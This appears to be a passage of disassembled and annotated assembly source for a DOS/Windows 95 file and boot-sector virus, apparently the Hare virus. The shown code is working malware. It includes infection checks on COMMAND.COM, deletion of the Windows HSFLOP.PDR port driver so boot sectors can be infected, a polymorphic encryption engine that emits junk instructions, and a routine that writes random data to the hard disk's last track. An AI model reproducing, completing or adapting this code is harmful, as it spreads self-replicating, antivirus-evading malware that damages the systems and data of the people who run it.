                MOV     DI, OFFSET FileName2    ; Filename is COMMAND.* ?
		MOV     SI, OFFSET Command_Com
		MOV     CX, BX
		REPE    CMPSB

                OR      CX, CX                  ; Found?
		STC
                JZ      LOC_63                  ; Then exit with carry set.
		CLC
LOC_63:         POP     DS
                RETN
LOC_64:
                OR      Flags, 00000010b
		POP     DS
		RETN
LOC_65:
                OR      Flags, 00000001b
		STC
		POP     DS

		RETN



Check_FileName:
		PUSH    DS
		POP     ES

		XOR     AL, AL
		MOV     DI, DX
                XOR     CX, CX                  ; *** Do I have 2 say more?!
		MOV     CL, 0FFh
		MOV     BX, CX
		CLD
		REPNE   SCASB                   ; Find end of ASCIIZ-string.

		DEC     DI
		DEC     DI
		SUB     BX, CX
		MOV     CX, BX
		STD
		MOV     AL, '\'
		REPNE   SCASB                   ; Find start filename.

		SUB     BX, CX
		MOV     CX, BX
		INC     DI
		MOV     AL,ES:[DI]

		CMP     AL, '\'
		JNE     LOC_66

		INC     DI
		MOV     SI, DI
		MOV     DI, OFFSET FileName2
		DEC     CX
		DEC     BX
		CLD

		PUSH    CS
		POP     ES

		REP     MOVSB
		CALL    SUB_14

		RETN
LOC_66:
		MOV     BX, 0Ah

		PUSH    CS
		POP     ES

		RETN

FileName1       DB      'DUM1.EXE.EXE', 0
FileName2       DB      'DUM1.EXECOME', 0
Command_Com     DB      'COMMAND'
Port_Driver     DB      '\SYSTEM\IOSUBSYS\HSFLOP.PDR', 0



; Searches the program environment to find a 'WIN'-string. This matches
; normally to either WINBOOTDIR or WINDOWS, thus the Windows directory.
; It then appends the path '\SYSTEM\IOSUBSYS\HDFLOP.PDR' to the found
; directoryname. The file HSFLOP.PDR handles the port-level-access to disks,
; without it Windows needs to use the slow INT 13h (which the virus has
; hooked). Hare does this to also infect bootsectors under Windows 95/NT.

Del_PortDriver:

		PUSH    DS
		PUSH    DX

		XOR     DI, DI

Find_String:
		MOV     CX, 0FFFFh

		MOV     AH, 62h                 ; Get PSP.
		INT     21h

		MOV     ES, BX
		MOV     ES, ES:[2Ch]            ; ES = Program's environment-
		CLD                             ; block (PATH, SET, etc).

Get_Next_String:

		MOV     AL, 0
		REPNE   SCASB                   ; Find end of ASCIIZ-string.
		MOV     AX, ES:[DI]             ; Get first word.

		OR      AL, AL                  ; No settings?
		JZ      Exit_Del_Driver         ; Then exit routine.

		AND     AX, 1101111111011111b   ; Convert to uppercase.

		CMP     AX, 'IW'                ; WINBOOTDIR/WINDOWS?
		JNE     Get_Next_String

		MOV     AL, ES:[DI+2]           ; Get third character.
		AND     AL, 11011111b           ; To uppercase.

                CMP     AL, 'N'                 ; Have we found WIN ?
		JNE     Get_Next_String

                MOV     AL, '='                 ; Value.

		REPNE   SCASB                   ; Find '='.
		JCXZ    Exit_Del_Driver         ; Not found?

		MOV     SI, DI
		MOV     BX, DI
		MOV     DI, OFFSET Buffer
		MOV     DX, DI

		PUSH    ES
		POP     DS

		PUSH    CS
		POP     ES


		; This copies the string found above to our buffer.
Copy_Byte:
		LODSB                           ; Copy byte to our buffer.
		STOSB

		OR      AL, AL                  ; End reached?
		JNZ     Copy_Byte               ; No, then continue copy.

		DEC     DI

		PUSH    CS
		POP     DS

		MOV     SI, OFFSET Port_Driver  ; Append path to Windows-dir.
		MOV     CX, 28
		REP     MOVSB

		MOV     AH, 41h                 ; Delete portdriver.
		CALL    Traced_i21h
		JNC     Exit_Del_Driver

		CMP     AL, 02h                 ; File not found?
						; (Wrong string fetched?)
		MOV     DI, BX
		JZ      Find_String

		STC
Exit_Del_Driver:

		POP     DX
		POP     DS

		RETN

NOP_Functions   DB      0
                DB      1Ah, 02h        ; Read real-time clock.
                DB      1Ah, 04h        ; Read date from real-time clock.
                DB      1Ah, 03h        ; Set real-time clock.
                DB      10h, 08h        ; Read character and attribute.
                DB      10h, 0Fh        ; Get current display mode.
                DB      10h, 0Bh        ; Set color palette.
                DB      21h, 0Dh        ; Reset disk.
                DB      21h, 18h        ; Reserved.
                DB      21h, 19h        ; Get default drive.
                DB      21h, 2Ah        ; Get system date.
                DB      21h, 2Ch        ; Get system time.
                DB      21h, 30h        ; Get DOS version-number.
                DB      21h, 4Dh        ; Get returncode.
                DB      21h, 51h        ; Get PSP segment.
                DB      21h, 54h        ; Get verify-flag.
                DB      21h, 62h        ; Get PSP segment.
                DB      21h, 0Bh        ; Check STDIN status.
                DB      21h, 0Dh        ; Flush DOS buffers.
                DB      21h             ; 2Bh

; *** Better use only the INT-number.

Int_Table:      INT     2Bh
		INT     2Ch
		INT     2Dh
		INT     28h
                INT     1Ch     ; *** This is bad programming!
                INT     08h     ; *** This 1 2!
		INT     0Ah
		INT     0Bh
		INT     0Ch
		INT     0Dh
		INT     0Fh
		INT     0Eh
		INT     70h
		INT     71h
		INT     72h
		INT     73h
		INT     74h
		INT     75h
                INT     76h   ; Can cause problems 4 example wit MegaStealth.
		INT     77h
		INT     01h
                INT     03h     ; 1 byte breakpoint.
                INT     03h

PushPop_Pairs:
		PUSH    AX
		POP     AX
		PUSH    BX
		POP     BX
		PUSH    CX
		POP     CX
		PUSH    DX
		POP     DX
		PUSH    DI
		POP     DI
		PUSH    SI
		POP     SI
		PUSH    BP
		POP     BP
		PUSH    DS
		POP     DS
		PUSH    ES
		POP     ES
		PUSH    SS
		POP     SS

Random          DW      0
DATA_74         DB      1Eh


SUB_17:
                CALL    Get_Random_Poly         ; Get random# in AX.

                TEST    AH, 00010000b           ; 1/8 chance.
		JZ      LOC_74

		CMP     BL, 02h
		JE      LOC_72

		CMP     BL, 04h
                JE      Get_NOP_Function

		JMP     LOC_74


LOC_72:
		ADD     AL, 64
		JNC     LOC_72

                AND     AL, 11111110b           ; 

		CMP     AL, DATA_74
		JE      SUB_17

		MOV     DATA_74, AL

		PUSH    SI

                CBW
		XCHG    BX, AX
		MOV     SI, OFFSET Int_Table
		MOV     AX, [BX+SI]

		POP     SI

		MOV     BL, 02h

		RETN

;---------------------------------
; Returns: AX = MOV AH, function.
;          DX = INT interrupt.
;---------------------------------
Get_NOP_Function:

                ADD     AL, 38                  ; Must be overflow.
                JNC     Get_NOP_Function

                AND     AL, 11111110b           ; Make even (0 - 36).

		CMP     AL, DATA_74
		JE      SUB_17

                MOV     DATA_74, AL
		PUSH    SI
		CBW
		XCHG    BX, AX
                MOV     SI, OFFSET NOP_Functions

		MOV     AH, [BX+SI]
		MOV     DH, [BX+SI+1]

                MOV     AL, 0B4h                ; MOV AH, value.
                MOV     DL, 0CDh                ; INT-opcode.
		POP     SI
		MOV     BL, 04h

		RETN
LOC_74:
		MOV     BL, 00h

		RETN




SUB_18:
                MOV     BP, 3

LOC_75:         DEC     BP
		JZ      LOC_RET_78

                CALL    SUB_17                  ; returns DX  AX int func
                ADD     CL, BL

                CMP     BL, 2
		JB      LOC_77
		JA      LOC_76

		STOSW
		JMP     LOC_75
LOC_76:
		STOSW

		MOV     AX, DX
		STOSW
LOC_77:
		JMP     LOC_75

LOC_RET_78:
		RETN


; Returns: BX = Random number 1 or 2.
Get_Boolean:
		XOR     BX, BX

Get_New_Value:  PUSH    AX

                CALL    Get_Random_Poly
		MOV     BL, AL

		POP     AX

		MOV     AL, BL

                OR      BL, BL                  ; We don't want zeroes.
                JZ      Get_New_Value

                AND     BL, 00000011b           ; 1 - 3.

                CMP     BL, 3                   ; 1 - 2.
                JB      Exit_Get_Boolean

                JMP     Get_New_Value

Exit_Get_Boolean:
                RETN


Check_Poly_Sector:

                PUSH    CS                      ; CS=DS=ES.
		PUSH    CS
		POP     ES
		POP     DS

		MOV     AH, 08h                 ; Get disk drive parameters
		MOV     DL, 80h                 ; of 1st harddisk.
		INT     13h

                MOV     BX, Poly_Sector
		MOV     AX, 0201h
		INC     CH                      ; Last track of harddisk.
		DEC     DH                      ;
		DEC     DH
		MOV     CL, 01h                 ; 1st sector.
		MOV     DL, 80h
		INT     13h
		JC      Exit_Poly_Check

		CALL    Get_Random
		AND     AL, 00001111b           ; 0 - 15.

		CMP     AL, 7
		JE      Gen_Poly_Sector

		CMP     [BX], 0CCDDh            ; Polysector already present?
		JE      Exit_Poly_Check

Gen_Poly_Sector:
                MOV     CX, (512 / 2)           ; 256 words.
		MOV     DI, BX

Store_Random:
		CALL    Get_Random
		ADD     AX, [DI-2]              ; Add previous value.
		MOV     [DI], AX
		INC     DI
		INC     DI
                LOOP    Store_Random

		MOV     [BX], 0CCDDh            ; Polysector signature.
LOC_83:
		MOV     AH, 08h                 ; Get disk drive parameters.
		MOV     DL, 80h
		INT     13h

                MOV     BX, Poly_Sector         ; Write polysector to disk.
		MOV     AX, 0301h
		INC     CH
		DEC     DH
		DEC     DH
		MOV     CL, 01h
		MOV     DL, 80h
		INT     13h
		JC      LOC_85

Exit_Poly_Check:

		RETN
LOC_85:
		MOV     AX, 440Dh
		MOV     BX, 180h
		MOV     CX, 84Bh
                INT     21h                   ; DOS Services  ah=function 44h
                                              ; IOctl-D block device control
                                              ; bl=drive, cx=category/type
                                              ; ds:dx ptr to parameter block
		JMP     LOC_83

;
; Gets a random number from the polymorphic sector.
; Returns: AX = Random number.
;
Get_Random_Poly:

		PUSH    BX

                MOV     BX, CS:Poly_Sector

                CMP     BX, 512
                JB      Skip_Flip

                AND     BX, 00000001b           ; 0 - 1.
                XOR     BL, 00000001b           ; Flip.

Skip_Flip:      ADD     BX, 2                   ; Next word.
                MOV     CS:Poly_Sector, BX
                MOV     AX, CS:[Poly_Sector+BX]

		POP     BX

		RETN


;
; Return: AX = Random value (1 - 65535).
;
Get_Random:
		XOR     AL, AL
                OUT     43h, AL                 ; Port 43h, 8253 timercontrol
                                                ; AL = 0, latch timer0 count
                JMP     $+2                     ; Delay for I/O.
                IN      AL, 40h                 ; Get random number.
                MOV     AH, AL

		IN      AL, 40h
                XOR     AL, AH                  ; Randomize number.

		XCHG    AL, AH
		PUSH    CX
		MOV     CL, AH
		AND     CL, 00001111b
		ROL     AX, CL
		MOV     CX, AX
		AND     CX, 0000011111111111b

Delay_Loop:
		JMP     $+2
		NOP
		LOOP    Delay_Loop

		POP     CX
		XOR     CS:Random, AX
		ADD     AX, CS:Random

		OR      AH, AH
		JZ      Get_Random

		OR      AL, AL
		JZ      Get_Random

		RETN

Poly_Engine:
		PUSH    SI
                PUSH    BX                      ; Filehandle.

		CLD
                MOV     DS:Poly_Sector, 0
                XOR     SI, SI
                MOV     DI, OFFSET Buffer + 28  ; After header.
                MOV     DATA_77, offset fuxor

                MOV     AX, Host_Entrypoint
                MOV     Host_Start, AX

                CALL    Get_Boolean

                MOV     AL, Encr_Methods[BX]
                MOV     AH, 0E0h
                MOV     word ptr Poke1, AX
                MOV     word ptr Shit3, AX
		XOR     BL, 03h

                MOV     AL, Encr_Methods[BX]
                MOV     Used_Encr_Algo, AL
                CALL    Get_Random_Poly
		MOV     DATA_94, AL
		MOV     Key_3, AL
		MOV     DATA_82, AH

		POP     BX
		PUSH    BX

		MOV     word ptr Decrypt_2, 0F72Eh
                MOV     BYTE PTR Key_2, 15h
                MOV     CX, 20


LOCLOOP_89:
		LODSB                           ; String [si] to al
Shit3:

;*              SUB     AL,AH
		DB       28H,0E0H               ;  Fixup - byte match
		STOSB                           ; Store al to es:[di]
		LOOP    LOCLOOP_89              ; Loop if cx > 0

                MOV     CX, 1ECh

LOCLOOP_90:
		LODSB                           ; String [si] to al

		CMP     SI,1A3H
		JB      LOC_91

		XCHG    DATA_94, AH
                XOR     AL, AH
		ADD     AH, 01h
		XCHG    DATA_94, AH
LOC_91:
		NOT     AL
Poke1:
;*              SUB     AL,AH
		DB       28H,0E0H               ;  Fixup - byte match
		STOSB
		LOOP    LOCLOOP_90

		CALL    SUB_38
		JC      LOC_94

                MOV     CX, DATA_77
		JCXZ    LOC_93                  ; Jump if cx=0

                SUB     CX, 512
		JC      LOC_92

		MOV     DATA_77, CX
		MOV     CX, 200h

		JMP     LOCLOOP_90
LOC_92:
                ADD     CX, 512
		MOV     DATA_77, 0

		MOV     DX, CX

		JMP     LOCLOOP_90
LOC_93:
		CALL    SUB_39
                CALL    SUB_31
		CALL    SUB_24

                MOV     DX, OFFSET Buffer + 256 ; Append polymorphic copy.
		MOV     AH, 40h
                ADD     CX, 17
		NOP
		CALL    Traced_i21h
		CLC
LOC_94:
		POP     BX
		POP     SI

		RETN


SUB_24:
		PUSH    BX
		PUSH    BP

                MOV     SI, OFFSET Buffer + 28
                MOV     DI, OFFSET Buffer + 256

                XOR     CX, CX

                CALL    Make_Clear_Flags
		MOV     BL, 04h
		CALL    SUB_18
		CALL    SUB_34
		CALL    SUB_36
                CALL    Make_Uncon_JMP
		CALL    SUB_25
                CALL    Make_Uncon_JMP
		CALL    SUB_25
                CALL    Make_Uncon_JMP
		CALL    SUB_25
                CALL    Make_Uncon_JMP
		MOV     BL, 02h
		CALL    SUB_18
                CALL    Make_Uncon_JMP
                CALL    Get_Random_Poly

                CMP     AH, 128
		JB      LOC_95

                MOVSB
		JMP     LOC_96
LOC_95:
		OR      Flags, 00010000b
		SUB     CL, 01h
		INC     SI
LOC_96:
                CALL    Make_Uncon_JMP
		CALL    SUB_28
		MOV     CH,CL
                MOV     BL, 2
		CALL    SUB_18
                CALL    Make_Uncon_JMP
		MOVSW
		MOVSB
                CALL    Make_Uncon_JMP
		CALL    SUB_33
                MOV     BL, 2
		CALL    SUB_18
		CALL    SUB_27
                MOV     BL, 2
		CALL    SUB_18
                CALL    Make_Uncon_JMP
		CALL    SUB_26
                MOV     BL, 2
		CALL    SUB_18
                CALL    Make_Uncon_JMP
                MOV     AL, CL
                SUB     AL, CH
                MOV     CH, AL
		LODSW                           ; String [si] to ax
		SUB     AH, CH
		STOSW
		MOV     BL, 02h
		CALL    SUB_18
                CALL    Make_Uncon_JMP
		CALL    SUB_30
                CALL    Get_Random_Poly
		AND     AL, 00000111b
		ADD     CL, AL
		MOV     CH, 00h

                CMP     Host_Type, CH           ; Host is a .COM-file?
                JE      Skip_Byte_Pages

                ADD     Buffer.File_Mod512, CX

                CMP     Buffer.File_Mod512, 512
                JB      Skip_Byte_Pages

                INC     Buffer.Byte_Pages       ; Rounding.

                SUB     Buffer.File_Mod512, 512
                JNZ     Skip_Byte_Pages

                DEC     Buffer.Byte_Pages

Skip_Byte_Pages:

		POP     BP
		POP     BX

		RETN

SUB_25:
		PUSH    CX

		XOR     CX, CX
		MOV     AL, DATA_92
		MOV     CL, AL
                SHR     AL, 2                   ; DIV 4.
		MOV     DATA_92, AL

                AND     CL, 03h
		REP     MOVSB

		POP     CX

		RETN


SUB_26:
                CALL    Get_Random_Poly

                CMP     DATA_97,4
		JAE     LOC_98

		XOR     AL, AH
		JP      LOC_98                  ; Jump if parity=1

		MOVSB

		RETN
LOC_98:
		MOV     BL, DATA_96
		MOV     BH, 00h

                CMP     DATA_97, 06h
		JAE     LOC_100

                CMP     DATA_97, 04h
		JAE     LOC_99

		TEST    AL, 00000001b
		JNZ     LOC_100

LOC_99:         MOV     DL, 01h
                MOV     DH, Uncon_Jumps[BX]

		JMP     LOC_101

LOC_100:
		MOV     DL, 0FFh
                MOV     DH, DATA_109[BX]

LOC_101:        TEST    AL, 00000010b
		JNZ     LOC_102

                MOV     AL, 81h
		STOSB

		MOV     AL, DH
		STOSB

		MOV     AL, DL
                CBW
		STOSW
		INC     SI
		ADD     CL, 03h
		RETN
LOC_102:
                MOV     AL, 83h                 ; ADD
		STOSB

		MOV     AL, DH
		STOSB

		MOV     AL, DL
		STOSB

		INC     SI
		ADD     CL, 02h
		RETN

		DB      0C3H


SUB_27:
                CALL    Get_Random_Poly
		XOR     AL, AH
		JNS     LOC_103                 ; Jump if not sign
		MOVSB

		RETN
LOC_103:
		MOV     BL, DATA_94
		MOV     BH, 00h
                CMP     DATA_93, 80h
		NOP
		JA      LOC_105

		TEST    AL, 00000001b
		JNZ     LOC_104

		MOV     DL, 01h
		MOV     DH, Uncon_Jumps[BX]

		JMP     LOC_107
LOC_104:
		MOV     DL, 0FFh
		MOV     DH, DATA_109[BX]
		JMP     LOC_107
LOC_105:
		TEST    AL, 00000001b
		JNZ     LOC_106

		MOV     DL, 01h
		MOV     DH, DATA_109[BX]
		JMP     LOC_107
LOC_106:
		MOV     DL, 0FFh
		MOV     DH, Uncon_Jumps[BX]

LOC_107:        TEST    AL, 00000010b
		JNZ     LOC_108

		MOV     AL, 81h
		STOSB

		MOV     AL, DH
		STOSB

		MOV     AL, DL
                CBW
		STOSW

		INC     SI
		ADD     CL, 03h
		RETN

LOC_108:
                MOV     AL, 83h                 ; ADD
		STOSB

		MOV     AL, DH
		STOSB

		MOV     AL, DL
		STOSB

		INC     SI
		ADD     CL, 02h

		RETN

SUB_28:
                CMP     DATA_93, 128            ; 50% chance.
                NOP
		JA      LOC_RET_112

		PUSH    DX
		MOV     DX, OFFSET Buffer
		MOV     AL, DATA_93
		AND     AL, 07h
                CBW
		INC     AX
		ADD     DX,AX
		MOV     BL,DATA_97

		CMP     BL, 06h
		JE      LOC_109

		TEST    BL, 00000001b
		JNZ     LOC_109

		DEC     DX

LOC_109:        MOV     AH, AL
		XOR     BX, BX
                MOV     BL, DATA_94
		MOV     AL, 81h
		STOSB

		TEST    AH, 00000001b
		JZ      LOC_110

                MOV     AL, Uncon_Jumps[BX]     ; Store JMP opcode.
		STOSB

		MOV     AX, DX
                NEG     AX                      ; JMP backwards.
		STOSW
		JMP     LOC_111
LOC_110:
                MOV     AL, DATA_109[BX]
                STOSB

                MOV     AX, DX
                STOSW
LOC_111:        ADD     CL,4
		POP     DX

LOC_RET_112:
		RETN



Make_Uncon_JMP:
                CALL    Get_Random_Poly

                TEST    AL, 00100000b           ; 1/8 chance.
		JZ      LOC_RET_116

                TEST    AL, 00001000b           ; 1/8 chance.
		JZ      LOC_113

                AND     AH, 03h                 ; 0 - 3.
                ADD     AH, 01h                 ; Prevent zero JMP.

                MOV     AL, 0EBh                ; JMP SHORT opcode.
                STOSW                           ; Store JMP SHORT.

		ADD     CL, 02h
		MOV     AL, AH

		JMP     LOC_114
LOC_113:
                AND     AH, 03h                 ; 0 - 3.
                ADD     AH, 01h                 ; 1 - 4.

                MOV     AL, 0E9h                ; Store JMP opcode.
		STOSB

                MOV     AL, AH                  ; Store dataword.
                CBW
		STOSW

                ADD     CL, 3
LOC_114:
                MOV     BL, AL
LOC_115:        CALL    Get_Random_Poly
		MOV     AH, AL

                CMP     AH, 2Eh                 ; CS: override?
                JE      LOC_115                 ; Then get another value.

		AND     AH, 0F8h

                CMP     AH, 0B0h                ; MOV AL ?
                JE      LOC_115                 ; Then get another value.

		STOSB
		ADD     CL, 01h

                SUB     BL, 01h                 ; JMP-Hole filled with
                JNZ     LOC_115                 ; garbage?

LOC_RET_116:
		RETN

SUB_30:
		TEST    Flags, 00010000b
		JNZ     LOC_119

                CALL    Get_Random_Poly

		TEST    AL, 00000100b
		JNZ     LOC_118

		MOVSB

		RETN
LOC_118:
		AND     AH,7

		CMP     AH, 04h
		JE      SUB_30

		MOV     AL, AH
		OR      AL, 58h
		STOSB

		MOV     AL, 0FFh
                OR      AH, 0E0h
		STOSW

		ADD     CL, 02h

		RETN

LOC_119:
                XOR     Flags, 10h
                MOV     AL, 0E9h                ; JMP opcode.
                STOSB

                ADD     CL, 2
		MOV     AL, CL
                CBW
                ADD     AX, Virus_Size + 17
		NEG     AX
                STOSW

		RETN


SUB_31:
		PUSH    BX
		MOV     SI, 0E70h

                CALL    Get_Random_Poly
		JNP     LOC_120                 ; Jump if not parity

                MOV     DI, OFFSET Used_MOV_Ptr
		MOV     AX, [DI]
                PUSH    [DI+2]
		PUSH    SI

		MOVSW
		MOVSB

		POP     SI
		MOV     [SI], AX
		POP     AX
		MOV     [SI+2], AL
LOC_120:
                MOV     DI, OFFSET Buffer + 28
                CALL    Get_Random_Poly

		CMP     AL, 55h
		JB      LOC_121

		CMP     AL, 0AAh
		JB      LOC_122

		MOV     AX, [SI+3]

		STOSW
		MOVSW
		MOVSB

		INC     SI
		INC     SI

                MOVSW
                MOVSB

                MOV     DATA_92, 3Eh
		JMP     LOC_123
LOC_121:
                MOVSW
                MOVSB

		MOV     AX,[SI]
		INC     SI
		INC     SI
                MOVSW
                MOVSB
                STOSW
                MOV     DATA_92, 2Fh
		JMP     LOC_123
LOC_122:
                MOVSW
                MOVSW
                MOVSW
                MOVSW
                MOV     DATA_92, 3Bh
LOC_123:
		MOV     CX, 09h
		REP     MOVSB
		POP     BX
		RETN


Make_Clear_Flags:

                CALL    Get_Random_Poly         ; Get random number in AX.

                CMP     AL, 128                 ; 50% chance.
		JB      LOC_RET_127

		TEST    AH, 00001000b
                JNZ     LOC_125

                MOV     AL, 0FAh                ; CLI
Store1:
		STOSB
		ADD     CL, 01h

		RETN
LOC_125:
		PUSH    BX

                MOV     BX, OFFSET PushPop_Pairs

LOC_126:        ADD     AL, 20                  ; Must be 20 or above.
                JNC     LOC_126                 ; Overflow?

                CBW
                AND     AL, 0FEh                ; Number must be even.
		ADD     BX, AX
                MOV     AH, [BX]                ; Get PUSH reg.

                POP     BX

                MOV     AL, 9Dh                 ; POPF

                CMP     Host_Type, 01h          ; Host is .EXE ?
                JE      Store1

		STOSW
		ADD     CL, 02h

LOC_RET_127:
		RETN

LOC_128:
                XOR     Flags, 8

		RETN

SUB_33:
		TEST    Flags, 00001000b
		JNZ     LOC_128

		PUSH    BX
LOC_129:
                CALL    Get_Random_Poly

		TEST    AH, 00000001b
		JZ      LOC_131

		AND     AX, 07h
		MOV     BX, AX

		CMP     BL, 04h
		JNE     LOC_130

                CMP     DATA_81, 0B0h
		JE      LOC_129

                CMP     DATA_96, 00h
		JE      LOC_129
LOC_130:
		MOV     AL, DATA_100[BX]
		STOSB

		INC     CL
		POP     BX

		RETN
LOC_131:
                CMP     DATA_96, 0
                JZ      LOC_129

                CMP     Used_Reg8, 0
                JZ      LOC_129
LOC_132:
                CALL    Get_Random_Poly
                AND     AX, 7

                CMP     AL, 5
                JA      LOC_132

                SHL     AL, 1                   ; MUL 2.
                MOV     BX, AX
                MOV     AX, DATA_101[BX]
                STOSW

		CMP     BL,6
                JA      LOC_133

                CALL    Get_Random_Poly
                AND     AL, 0Fh
                STOSB
                ADD     CL, 1

                CMP     BL, 6
                JNE     LOC_133

                MOV     AL, AH
                STOSB
                ADD     CL, 1
LOC_133:
                ADD     CL, 2
		POP     BX

		RETN

SUB_34:
                CALL    Get_Random_Poly

		CMP     AX, 5555h
		JB      LOC_RET_136

		OR      Flags, 00001000b

                CALL    Gen_Dummy_Int
                CALL    Get_Random_Poly

		XCHG    BX, AX
                AND     BX, 02h                 ; 0 or 2.
                MOV     AX, Load_BP[BX]
		STOSW

                MOV     DX, Host_Entrypoint
		ADD     DX, OFFSET Buffer
		ADD     DX, CX
		ADD     CL, 02h

		TEST    AL, 00001000b
		JNZ     LOC_134

                MOV     AL, 81h                 ; Arithmic, WORD PTR.
                STOSB

                ADD     CL, 7
                CALL    Store_Operand

                MOV     AL, 0FAh
                STOSB

		XCHG    DX, AX
		STOSW

		RETN


LOC_134:
		MOV     AL, 80h
		STOSB

		ADD     CL,6
                CALL    Store_Operand

                CMP     AH, 80h
                JA      LOC_135

                MOV     AL, 0FBh
                STOSB
                MOV     AL, DH
                STOSB

		RETN
LOC_135:
		MOV     AL, 0FAh
		STOSB

		XCHG    DX, AX
		STOSB

LOC_RET_136:
		RETN

;
Store_Operand:
                CALL    Get_Random_Poly
		MOV     BL, AL
		AND     BX, 07h

		CMP     BL, 04h
                JA      Store_Operand

                MOV     AL, Arithm_Operands[BX]
		STOSB

		CMP     BL, 03h
		JE      LOC_139

		CMP     BL, 04h
		JNE     LOC_RET_140

		TEST    BYTE PTR [DI-2], 00000001b
		JNZ     LOC_138

		NEG     DH
		NEG     DL

		RETN
LOC_138:
		NEG     DX
		RETN
LOC_139:
		NOT     DX

LOC_RET_140:
		RETN



SUB_36:
		TEST    Flags, 00001000b
		JZ      LOC_RET_141

                CALL    Get_Random_Poly
		AND     AH, 7Fh
		ADD     AH, 0Ah
		MOV     AL, 75h
		STOSW

LOC_RET_141:
		RETN


Gen_Dummy_Int:
		ADD     CL, 02h
		MOV     BL, 2Ah
                CALL    Get_Random_Poly
LOC_142:
		ADD     AL, BL
		JNC     LOC_142

		AND     AX, 0000000011111110b
		XCHG    BX, AX
                MOV     AX, OFFSET Int_Table[BX]
		STOSW

		RETN


SUB_38:
		PUSH    AX
		CMP     DATA_77,0
		MOV     CX,200H
		JNZ     LOC_143
		MOV     CX,DX
LOC_143:
                MOV     DX, OFFSET Buffer + 28
		MOV     DI, DX
		MOV     AH, 40h
		CALL    Traced_i21h
		POP     AX

		RETN


DATA_77         DW      0E6Ah
Host_Entrypoint DW      0
DATA_79         DB      0BFh
DATA_80         DW      9
DATA_81         DB      0B6h
DATA_82         DB      78h
Used_MOV_Ptr    DB      0BBh
Host_Start      DW      0
Used_Push_Ptr   DB      57h
Used_Override   DB      2Eh
Used_Encr_Algo  DB      0
Shit1           DB      35h
Used_Ptr        DB      4Fh
Shit8           DB      4Bh
Shit6           DB      77h
                DB      0F9h, 0C3h


SUB_39:
		PUSH    BX

                CALL    Get_Boolean
                MOV     AH, MOV_Ptr[BX]
                MOV     Used_MOV_Ptr, AH

                MOV     AH, Push_Ptr[BX]
                MOV     Used_Push_Ptr, AH

                CALL    Get_Random_Poly
		MOV     DATA_93, AH

                CMP     AH, 128                 ; 50% chance.
		JA      LOC_145

                MOV     AH, Dec_Ptr[BX]

		JMP     LOC_146
LOC_145:
                MOV     AH, Inc_Ptr[BX]
LOC_146:
                MOV     Used_Ptr, AH
                MOV     DL, BL
                ADD     BL, 3

                CMP     BL, 3
		JNE     LOC_147

                SUB     BL, 2
LOC_147:
		MOV     DATA_94,BL
LOC_148:
                CALL    Get_Random_Poly
		NOT     AX
		AND     AL, 07h
		MOV     BL, AL
		SHR     AL, 01h

		CMP     DATA_94, AL
		JE      LOC_148

                MOV     Used_Reg8, AL
                MOV     AH, MOV_Reg8[BX]
		MOV     DATA_81, AH
		SHL     DL, 03h
		ADD     BL, DL
                MOV     AH, DATA_111[BX]
		MOV     Shit1, AH
LOC_149:
                CALL    Get_Random_Poly
		NOT     AX

		MOV     BL, AL
		AND     BL, 07h

                CMP     BL, 6
		JA      LOC_149

                CMP     DATA_94, BL
		JE      LOC_149

                CMP     Used_Reg8, BL
		JE      LOC_149

		MOV     DATA_96, BL
                MOV     AH, MOV_Reg16[BX]

		MOV     DATA_79, AH
                MOV     AH, OFFSET DEC_Reg16[BX]
                MOV     Shit8, AH

                CALL    Get_Random_Poly
                AND     AL, 00000111b           ; 0 - 7.
                CBW
                MOV     BX, AX
                MOV     AH, [Cond_Jumps+BX]
                MOV     Shit6, AH
                MOV     DATA_97, BL
                CALL    Get_Random_Poly
                NOT     AX
		XOR     BX, BX
		MOV     BL, AL
                AND     BL, 00000011b           ; 0 - 3.
                MOV     AL, Host_Type

                OR      AL, AL                  ; .COM-file?
		JZ      LOC_150

		MOV     BL, AL
LOC_150:
		MOV     AH, Overrides[BX]
                MOV     Used_Override, AH
		MOV     AL, DATA_93
                AND     AL, 00000111b           ; 0 - 7.
                CBW
                INC     AX                      ; 1 - 8.
                ADD     AX, OFFSET Buffer
		MOV     DATA_80, AX
		POP     BX

		RETN

DATA_92         DB      0
DATA_93         DB      38h
DATA_94         DB      5Dh
Used_Reg8       DB      3
DATA_96         DB      1
DATA_97         DB      4

Load_BP         DW      0EC8Bh  ; MOV   BP, SP.
                DW      5D54h   ; PUSH  SP / POP BP.

;--->                   CMP  XOR  SUB  AND  ADD
Arithm_Operands DB      7Eh, 76h, 6Eh, 66h, 46h


; These are probably one-byte dummy instructions for 386+.
DATA_100        DB      64h, 65h, 67h, 9Bh, 0D6h, 9Bh, 64h, 65h

DATA_101        DW      0F0C0H
		DB      0C1H,0F0H,0F6H,0C8H,0F7H,0C8H
		DB      0D0H,0F0H,0D1H,0F0H

;--->                    BX    DI    SI
MOV_Ptr         DB      0BBh, 0BFh, 0BEh
PUSH_Ptr        DB      053h, 057h, 056h
INC_Ptr         DB      043h, 047h, 046h
DEC_Ptr         DB      04Bh, 04Fh, 04Eh

;--->                    AX    BX    CX    DX    DI    SI    BP
MOV_Reg16       DB      0B8h, 0BBh, 0B9h, 0BAh, 0BFh, 0BEh, 0BDh
DEC_Reg16       DB      048h, 04Bh, 049h, 04Ah, 04Fh, 04Eh, 04Dh


;--->                         JMP
Uncon_Jumps     DB      0E8h, 0EBh, 0E9h, 0EAh, 0EFh, 0EEh, 0EDh ; JMPs.
DATA_109        DB      0C0h, 0C3h, 0C1h, 0C2h, 0C7h, 0C6h, 0C5h

;--->                    AL    AH    BL    BH    CL    CH    DL    DH
MOV_Reg8        DB      0B0h, 0B4h, 0B3h, 0B7h, 0B1h, 0B5h, 0B2h, 0B6h
DATA_111        DB      7
		DB       27H, 00H, 00H, 0FH, 2FH, 17H
		DB       37H, 05H, 25H, 1DH, 3DH, 0DH
		DB       2DH, 15H, 35H, 04H, 24H, 1CH
                DB       3CH, 0CH, 2CH, 14H, 34H

;                       JNZ  JNS  JG   JGE  JA   JNB  JB   JBE
Cond_Jumps      DB      75h, 79h, 7Fh, 7Dh, 77h, 73h, 72h, 76h

;--->                    DS    CS    ES    SS
Overrides       DB      03Eh, 02Eh, 026h, 036h      ; Segment overrides.

Encr_Methods    DB      30h, 00h, 28h, 30h      ; encr.

;--->                    AL    AH    BL    BH    CL    CH    DL    DH
ADD_Reg8        DB      0C0h, 0C4h, 0C3h, 0C7h, 0C1h, 0C5h, 0C2h, 0C6h
SUB_Reg8        DB      0E8h, 0ECh, 0EBh, 0EFh, 0E9h, 0EDh, 0EAh, 0EEh

